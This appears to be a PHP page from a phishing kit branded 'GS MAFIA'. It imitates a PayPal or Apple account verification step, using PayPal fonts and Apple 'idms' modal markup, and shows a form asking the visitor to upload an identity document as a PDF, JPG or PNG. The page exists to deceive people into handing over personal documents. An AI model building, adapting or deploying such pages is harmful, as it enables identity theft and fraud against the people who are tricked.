<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
?>
<div class="CTABannerContainer CTABannerContainer--billinginfopage ">
  <div class="DefaultGreeting">
    <div class="cta-banner">
      <div class="cta-headline">
        <span class="cta-name">
              <center><h2 style="margin-bottom: 0px;font-size: 28.5px; font-family: PayPal-Sans-Big, sans-serif;" ><?php echo $gs_idsub ?></h2></center>
        </span>
        <div class="textInput lap">
          <div class="fields email large">
            <div class="nativeDropdown  large ">
              <div class="selectDropdown ">
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<link href="css/jquery.fileuploader.css" media="all" rel="stylesheet">
<link href="css/jquery.fileuploader-theme-thumbnails.css" media="all" rel="stylesheet">
<link href="css/style.css" media="all" rel="stylesheet">
<div aria-hidden="false" id="idmsModalWrapper1535494562693-0" class="idms-modal mobile-full-page-wrapper web idms-modal-role-dialog" role="dialog" style="z-index: 100061;">
<div class="idms-modal-dialog">
  <div id="idms-modal-1535494562693-0" class="idms-modal-content modal-content  mobile-full-page">
    <div class="" tabindex="-1" style="outline: 0px;">
        <div class="idms-step-container">
          <div class="idms-step-wrapper">
            <div id="idms-step-1535494562759-0" class="idms-step
          ">
              <div class="idms-step-content">
                <div class="step-verify-code">
                  <div class="context-body clearfix">
                    <div class="security-code-wrapper security-code-alignment">
                      <div class="security-code">
                        <div class="" id="idms-error-wrapper-1535494562738-0">
                          <div id="security-code-wrap-1535494562738-1" class="security-code-wrap security-code-6" localiseddigit="">
                          <div style="text-align: center;"><br>
                            <p><? echo $gs_idsub2 ?></p>
                            <p>(PDF - JPG - PNG)</p>
                          </div>
                            <form id="uploadimage" action="" method="post" enctype="multipart/form-data">
                              <input type="file" name="files"  id="files">
                              <center>
                              <input type="submit" class="button button-primary last nav-action weight-medium" value="Upload">
                              </center>
                              <div id="message"></div>
                            </form>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    <div style="clear:both"></div>
  </div>  
</div>
</div>
<script src="js/jquery-3.1.1.min.js" crossorigin="anonymous"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="js/jquery.fileuploader.min.js" type="text/javascript"></script>
<script type="text/javascript" src="js/custom.js"></script>
<script type="text/javascript" src="js/script.js"></script>